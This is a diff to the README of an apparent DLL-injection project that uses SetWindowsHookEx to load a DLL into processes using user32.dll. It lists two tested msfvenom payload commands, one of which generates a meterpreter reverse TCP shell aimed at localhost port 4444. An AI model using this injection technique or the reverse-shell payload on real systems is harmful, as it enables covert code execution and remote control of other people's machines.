@@ -1,6 +1,6 @@
 # Global-SetWindowsHookEx-Injector
-Loads test.dll into a subset of processes that have user32.dll loaded
-that launches a thread that spawns a messagebox whenever it is loaded
+main.cpp: Loads test.dll into a subset of processes that have user32.dll loaded </br> 
+dllmain.cpp: Launches a thread that spawns a messagebox whenever it is loaded </br>
 ## Payloads that have been tested with this project
 `msfvenom -f c -p windows/x64/messagebox EXITFUNC=thread TEXT="Hello, from urmom"` </br>
 `msfvenom -p windows/x64/meterpreter_reverse_tcp EXITFUNC=thread RHOST=127.0.0.1 RPORT=4444 -f c -o file.txt`
